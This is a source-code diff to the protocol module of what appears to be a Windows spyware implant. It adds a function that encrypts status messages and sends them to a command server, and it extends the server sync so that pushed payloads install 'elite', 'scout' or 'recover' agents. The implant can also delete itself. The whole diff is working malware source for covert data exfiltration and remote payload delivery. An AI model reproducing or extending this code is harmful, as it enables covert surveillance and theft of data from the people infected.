@@ -24,7 +24,59 @@ BYTE pSessionKey[20];
 BYTE pLogKey[32];
 
 extern PDEVICE_CONTAINER pDeviceContainer;
+extern PULONG uSynchro;
 
+BOOL SendInfo(LPWSTR pInfoString)
+{
+	PBYTE pHeaderBuffer;
+	ULONG uHeaderSize;
+	BOOL bRetVal = TRUE;
+
+	// payload
+	PBYTE pCryptedString = (PBYTE)malloc(Align(wcslen(pInfoString)*sizeof(WCHAR), 16));
+	memset(pCryptedString, 0x0, Align(wcslen(pInfoString)*sizeof(WCHAR), 16));
+	memcpy(pCryptedString, pInfoString, wcslen(pInfoString)*sizeof(WCHAR));
+	Encrypt(pCryptedString, Align(wcslen(pInfoString)*sizeof(WCHAR), 16), pLogKey, PAD_NOPAD);
+
+	//header
+	CreateLogFile(PM_INFOSTRING, NULL, 0, FALSE, &pHeaderBuffer, &uHeaderSize);
+
+	//total_len + header + payload_len_clear + payload
+	ULONG uTotalLen = sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(wcslen(pInfoString)*sizeof(WCHAR), 16);
+	PBYTE pBuffer = (PBYTE) malloc(uTotalLen);
+	memset(pBuffer, 0x0, uTotalLen);
+
+	*(PULONG)pBuffer = uTotalLen; // total_len
+	memcpy(pBuffer + sizeof(ULONG), pHeaderBuffer, uHeaderSize); // header
+	
+	*(PULONG)(pBuffer + sizeof(ULONG) + uHeaderSize) = Align(wcslen(pInfoString)*sizeof(WCHAR), 16); // payload_len_clear
+	memcpy(pBuffer + sizeof(ULONG) + uHeaderSize + sizeof(ULONG), pCryptedString, Align(wcslen(pInfoString)*sizeof(WCHAR), 16));
+
+	PBYTE pCryptedBuffer;
+	if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pBuffer, uTotalLen, pSessionKey, &pCryptedBuffer)))
+	{
+		ULONG uResponseLen;
+		PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen);
+		if (pResponseBuffer)
+		{
+			Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
+			if (*(PULONG)pResponseBuffer != PROTO_OK)
+			{
+#ifdef _DEBUG
+				OutputDebugString(L"[!!] Failed to send Info\n");
+#endif
+				bRetVal = FALSE;
+			}
+			free(pResponseBuffer);
+		}
+	}
+
+
+	free(pCryptedString);
+	free(pBuffer);
+
+	return bRetVal;
+}
 
 BOOL SendEvidences()
 {
@@ -487,7 +539,8 @@ BOOL SyncWithServer()
 				Decrypt(pHttpUpgradeBuffer, uResponseLen, pSessionKey);
 
 				PPROTO_RESPONSE_UPGRADE pProtoUpgrade = (PPROTO_RESPONSE_UPGRADE)pHttpUpgradeBuffer;
-				PWCHAR pUpgradeName = (PWCHAR)malloc(pProtoUpgrade->uUpgradeNameLen);
+				PWCHAR pUpgradeName = (PWCHAR)malloc(pProtoUpgrade->uUpgradeNameLen + sizeof(WCHAR));
+				memset(pUpgradeName, 0x0, pProtoUpgrade->uUpgradeNameLen + sizeof(WCHAR));
 				memcpy(pUpgradeName, &pProtoUpgrade->pUpgradeNameBuffer, pProtoUpgrade->uUpgradeNameLen);
 #ifdef _DEBUG
 				pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
@@ -497,30 +550,36 @@ BOOL SyncWithServer()
 				free(pDebugString);
 #endif
 
-				//FIXME DELETE THIS (it's from memory now!)
-				PWCHAR pUpgradePath = GetTemp();
-				PWCHAR pRandString = GetRandomString(5);
-				PWCHAR pUpgradeFileName = (PWCHAR)malloc(4096*sizeof(WCHAR));
-				_snwprintf_s(pUpgradeFileName, 4096, _TRUNCATE, L"%s\\%s.tmp", pUpgradePath, pRandString);
-				free(pUpgradePath);
-				free(pRandString);
-#ifdef _DEBUG
-				OutputDebugString(pUpgradeFileName);
-#endif
-			
 				ULONG uFileLength = *(PULONG) (((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen);
 				PBYTE pFileBuffer = (PBYTE)(((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen) + sizeof(ULONG);
 
-				// upgrade & exit
-				if (Upgrade(pUpgradeFileName, pFileBuffer, uFileLength))
-					uGonnaDie = 1;
-#ifdef _DEBUG
-				else
-					OutputDebugString(L"[!!] Upgrade FAILED\n");
-#endif
+				if (!wcscmp(pUpgradeName, L"elite"))
+				{
+					if (UpgradeElite(pUpgradeName, pFileBuffer, uFileLength))
+						uGonnaDie = 1;
+					else
+					{
+						WCHAR pMessage[] = { L'E', L'l', L'F', L'a', L'i', L'l', L'\0' };
+						SendInfo(pMessage);
+					}
+				}
+				if (!wcscmp(pUpgradeName, L"scout"))
+				{
+					if (!UpgradeScout(pUpgradeName, pFileBuffer, uFileLength))
+					{
+						WCHAR pMessage[] = { L'S', L'c', L'F', L'a', L'i', L'l', L'\0' };
+						SendInfo(pMessage);
+					}
+				}
+				if (!wcscmp(pUpgradeName, L"recover"))
+				{
+					if (!UpgradeRecover(pUpgradeName, pFileBuffer, uFileLength))
+					{
+						WCHAR pMessage[] = { L'R', L'e', L'c', L'F', L'a', L'i', L'l', L'\0' };
+						SendInfo(pMessage);
+					}
+				}
 
-				free(pFileBuffer);
-				free(pUpgradeFileName);
 				free(pUpgradeName);
 				free(pHttpUpgradeBuffer);
 			}
@@ -531,7 +590,6 @@ BOOL SyncWithServer()
 	if (SendEvidences())
 		bRetVal = TRUE;
 	
-
 	// send BYE
 #ifdef _DEBUG
 	OutputDebugString(L"[*] Sending PROTO_BYE\n");
@@ -543,11 +601,18 @@ BOOL SyncWithServer()
 		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:499\n");
 #endif
 
-	if (uGonnaDie)
+	if (uGonnaDie == 1)
 	{
 		WinHTTPClose();
 		DeleteAndDie(TRUE);
 	}
+	/*
+	else if (uGonnaDie == 2)
+	{
+		WinHTTPClose();
+		ExitThread(0);
+	}
+	*/
 
 	free(pProtoMessage);
 	free(pInstanceId);
